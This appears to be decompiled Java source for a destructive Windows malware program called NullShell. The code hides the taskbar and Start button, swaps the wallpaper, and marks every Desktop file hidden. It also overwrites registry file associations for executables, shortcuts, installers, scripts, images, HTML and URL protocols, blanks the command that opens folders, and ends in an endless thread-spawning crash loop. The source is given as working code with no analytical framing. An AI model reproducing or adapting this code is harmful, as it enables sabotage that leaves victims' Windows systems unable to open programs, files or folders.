package me.NullShell.main;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.win32.W32APIOptions;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.lang.reflect.InvocationTargetException;
import java.net.URI;
import java.nio.file.CopyOption;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Map;
import java.util.function.Consumer;
import java.util.function.Predicate;
import java.util.stream.Stream;
import me.NullShell.utils.WinRegistry;

public class NullShell {
    public static void doIt() {
        NullShell.HideTaskbar();
        try {
            File f = new File(String.valueOf(System.getenv("USERPROFILE")) + File.separator + "Desktop" + File.separator + (int)(Math.random() * 1.0E9) + "_bg.png");
            if (!f.exists()) {
                InputStream is = NullShell.class.getResourceAsStream("/res/triggered.png");
                Files.copy(is, f.getAbsoluteFile().toPath(), new CopyOption[0]);
                User32.INSTANCE.SystemParametersInfo(20, 0, f.getAbsolutePath(), 1);
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        NullShell.hideDir(new File(String.valueOf(System.getenv("USERPROFILE")) + File.separator + "Desktop"));
        NullShell.doRegStuff();
        NullShell.crash();
    }

    public static void crash() {
        new Thread(new Runnable(){

            @Override
            public void run() {
                NullShell.crash();
            }
        }).start();
        do {
            System.out.println("suck");
        } while (true);
    }

    public static void doRegStuff() {
        NullShell.doShit1();
        NullShell.doShit(".exe");
        NullShell.doShit(".dll");
        NullShell.doShit(".lnk");
        NullShell.doShit(".gif");
        NullShell.doShit(".jpg");
        NullShell.doShit(".jpeg");
        NullShell.doShit(".png");
        NullShell.doShit(".bat");
        NullShell.doShit(".cmd");
        NullShell.doShit(".msi");
        NullShell.doShit(".install");
        NullShell.doShit(".installer");
        NullShell.doShit(".html");
        NullShell.doShit(".htm");
        NullShell.doShit(".reg");
        NullShell.doShit(".jar");
        NullShell.doShitWithURLs();
        NullShell.doChange();
    }

    public static void doChange() {
        try {
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Folder")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Folder");
            }
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Folder\\shell")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Folder\\shell");
            }
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Folder\\shell\\open")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Folder\\shell\\open");
            }
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Folder\\shell\\open\\command")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Folder\\shell\\open\\command");
            }
            WinRegistry.writeStringValue(-2147483647, "SOFTWARE\\Classes\\Folder\\shell\\open\\command", "", "");
            WinRegistry.writeStringValue(-2147483647, "SOFTWARE\\Classes\\Folder\\shell\\open\\command", "DelegateExecute", "");
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Unknown")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Unknown");
            }
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell");
            }
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell\\openas")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell\\openas");
            }
            if (!WinRegistry.exists(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell\\openas\\command")) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell\\openas\\command");
            }
            WinRegistry.writeStringValue(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell\\openas\\command", "", "");
            WinRegistry.writeStringValue(-2147483647, "SOFTWARE\\Classes\\Unknown\\shell\\openas\\command", "DelegateExecute", "");
        }
        catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    public static void doShit1() {
        try {
            for (String s : WinRegistry.readStringSubKeys(-2147483647, "SOFTWARE\\Classes\\")) {
                String a = WinRegistry.readString(-2147483647, "SOFTWARE\\Classes\\" + s, "");
                if (a != null && !a.isEmpty()) continue;
                WinRegistry.writeStringValue(-2147483647, "SOFTWARE\\Classes\\" + s, "", "vllt");
            }
        }
        catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    public static void doShitWithURLs() {
        try {
            for (String s : WinRegistry.readStringSubKeys(-2147483647, "SOFTWARE\\Classes\\")) {
                String a = WinRegistry.readString(-2147483647, "SOFTWARE\\Classes\\" + s, "");
                if (a == null || !a.startsWith("URL:")) continue;
                WinRegistry.writeStringValue(-2147483647, "SOFTWARE\\Classes\\" + s, "", "urltriggered");
            }
        }
        catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    public static void doShit(String s) {
        try {
            if (WinRegistry.readString(-2147483647, "SOFTWARE\\Classes\\" + s, "") == null) {
                WinRegistry.createKey(-2147483647, "SOFTWARE\\Classes\\" + s);
            }
            WinRegistry.writeStringValue(-2147483647, "SOFTWARE\\Classes\\" + s, "", "triggered");
        }
        catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    public static void hide(File f) {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "attrib \"" + f.getAbsolutePath() + "\" +s +h"});
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void hideDir(File f) {
        NullShell.hide(f);
        if (f.isDirectory()) {
            for (File file : f.listFiles()) {
                if (file.getName().equals("desktop.ini") || file.isDirectory() && (file.getName().equalsIgnoreCase("$RECYCLE.BIN") || file.getName().equalsIgnoreCase("RECYCLER"))) continue;
                NullShell.hide(file);
            }
        }
    }

    public static void hideDirWalk(File f) {
        try {
            NullShell.hide(f);
            Files.walk(Paths.get(f.toURI()), new FileVisitOption[0]).filter(path -> Files.isRegularFile(path, new LinkOption[0])).forEach(e -> NullShell.hide(e.toFile()));
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
    }

    public static void HideTaskbar() {
        User32.INSTANCE.ShowWindow(User32.Handle(), 0);
        User32.INSTANCE.ShowWindow(User32.HandleOfStartButton(), 0);
    }

    public static interface User32
    extends Library {
        public static final User32 INSTANCE = Native.loadLibrary("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);
        public static final int SW_HIDE = 0;
        public static final int SW_SHOW = 1;

        public boolean SystemParametersInfo(int var1, int var2, String var3, int var4);

        public int FindWindow(String var1, String var2);

        public int ShowWindow(int var1, int var2);

        public int FindWindowEx(int var1, int var2, String var3, int var4);

        public int GetDesktopWindow();

        public static int Handle() {
            return INSTANCE.FindWindow("Shell_TrayWnd", "");
        }

        public static int HandleOfStartButton() {
            int handleOfDesktop = INSTANCE.GetDesktopWindow();
            int handleOfStartButton = INSTANCE.FindWindowEx(handleOfDesktop, 0, "button", 0);
            return handleOfStartButton;
        }

        public boolean EnumWindows(WinUser.WNDENUMPROC var1, Pointer var2);

        public int GetWindowTextA(WinDef.HWND var1, byte[] var2, int var3);

        public boolean DestroyWindow(WinDef.HWND var1);
    }

}

